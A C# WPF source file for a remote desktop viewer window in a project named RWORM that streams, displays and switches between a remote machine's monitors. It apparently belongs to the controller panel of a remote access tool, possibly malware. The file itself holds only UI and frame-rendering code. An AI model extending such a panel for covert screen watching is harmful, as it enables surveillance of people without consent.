using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media.Imaging;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class RemoteDesktopWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private bool _paused;
        private bool _closed;
        private int  _frameCount;
        private int  _frameBusy;
        private DateTime _lastFpsCalc = DateTime.Now;
        private int _currentMonitor = 0;
        private bool _monitorsLoaded = false;

        public class DisplayItem
        {
            public int Index { get; set; }
            public string DisplayName { get; set; } = string.Empty;
            public override string ToString() => DisplayName;
        }

        public RemoteDesktopWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            Title   = $"Remote Desktop — {hostname}";
            if (TitleLabel != null) TitleLabel.Text = hostname;
            if (FpsLabel != null) FpsLabel.Text = "5";

            _server.RegisterRDHandler(guid, OnFrame);
            _server.RegisterRDMonitorsHandler(guid, OnMonitorsReceived);

            _ = _server.RequestMonitors(guid);
            _ = _server.StartRemoteDesktop(guid, _currentMonitor);
            if (StatusLabel != null) StatusLabel.Text = "Connecting...";
        }

        private void OnMonitorsReceived(byte[] data)
        {
            try
            {
                var json = Encoding.UTF8.GetString(data);
                using var doc = JsonDocument.Parse(json);
                var items = new List<DisplayItem>();

                foreach (var el in doc.RootElement.EnumerateArray())
                {
                    int idx = el.TryGetProperty("Index", out var ip) ? ip.GetInt32() : (el.TryGetProperty("index", out var ip2) ? ip2.GetInt32() : 0);
                    string name = el.TryGetProperty("Name", out var np) ? np.GetString() ?? "" : (el.TryGetProperty("name", out var np2) ? np2.GetString() ?? "" : "");
                    int w = el.TryGetProperty("Width", out var wp) ? wp.GetInt32() : (el.TryGetProperty("width", out var wp2) ? wp2.GetInt32() : 0);
                    int h = el.TryGetProperty("Height", out var hp) ? hp.GetInt32() : (el.TryGetProperty("height", out var hp2) ? hp2.GetInt32() : 0);

                    string title = $"Display {idx + 1}";
                    if (w > 0 && h > 0) title += $" ({w}x{h})";
                    items.Add(new DisplayItem { Index = idx, DisplayName = title });
                }

                if (items.Count == 0)
                {
                    items.Add(new DisplayItem { Index = 0, DisplayName = "Display 1 (Primary)" });
                }

                Dispatcher.BeginInvoke(new Action(() =>
                {
                    if (_closed || MonitorSelector == null) return;
                    _monitorsLoaded = false;
                    MonitorSelector.ItemsSource = items;
                    MonitorSelector.SelectedIndex = 0;
                    _monitorsLoaded = true;
                }));
            }
            catch { }
        }

        private void MonitorSelector_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (!_monitorsLoaded || MonitorSelector?.SelectedItem is not DisplayItem item) return;
            if (item.Index == _currentMonitor) return;

            _currentMonitor = item.Index;
            _ = _server.StartRemoteDesktop(_guid, _currentMonitor);
            if (StatusLabel != null) StatusLabel.Text = $"Switching to {item.DisplayName}...";
        }

        private void OnFrame(byte[] jpeg)
        {
            if (_closed || _paused || jpeg == null || jpeg.Length == 0) return;
            if (Interlocked.CompareExchange(ref _frameBusy, 1, 0) != 0) return;

            _frameCount++;

            var now = DateTime.Now;
            if ((now - _lastFpsCalc).TotalSeconds >= 1)
            {
                var fps = _frameCount;
                _frameCount  = 0;
                _lastFpsCalc = now;
                try
                {
                    Dispatcher.BeginInvoke(new Action(() =>
                    {
                        if (!_closed && FpsActual != null) FpsActual.Text = $"{fps} fps";
                    }));
                }
                catch { }
            }

            try
            {
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    try
                    {
                        if (_closed) return;
                        using var ms = new MemoryStream(jpeg);
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.StreamSource   = ms;
                        bmp.CacheOption    = BitmapCacheOption.OnLoad;
                        bmp.CreateOptions  = BitmapCreateOptions.None;
                        bmp.EndInit();
                        bmp.Freeze();
                        if (ScreenView != null) ScreenView.Source = bmp;
                        if (StatusLabel != null) StatusLabel.Text = $"Live — {bmp.PixelWidth}×{bmp.PixelHeight}";
                        if (StatusDot != null)
                        {
                            StatusDot.Fill = new System.Windows.Media.SolidColorBrush(
                                System.Windows.Media.Color.FromRgb(0x3F, 0xB9, 0x50));
                        }
                    }
                    catch { }
                    finally { Interlocked.Exchange(ref _frameBusy, 0); }
                }));
            }
            catch
            {
                Interlocked.Exchange(ref _frameBusy, 0);
            }
        }

        private void Pause_Click(object s, RoutedEventArgs e)
        {
            _paused = !_paused;
            if (PauseBtn != null) PauseBtn.Content = _paused ? "▶ Resume" : "⏸ Pause";
            if (StatusLabel != null) StatusLabel.Text = _paused ? "Paused" : "Live";
        }

        private void FpsSlider_Changed(object s, RoutedPropertyChangedEventArgs<double> e)
        {
            if (FpsLabel != null && FpsSlider != null)
                FpsLabel.Text = ((int)FpsSlider.Value).ToString();
        }

        protected override void OnClosed(EventArgs e)
        {
            _closed = true;
            _server.UnregisterRDHandler(_guid);
            _server.UnregisterRDMonitorsHandler(_guid);
            _ = _server.StopRemoteDesktop(_guid);
            base.OnClosed(e);
        }
    }
}
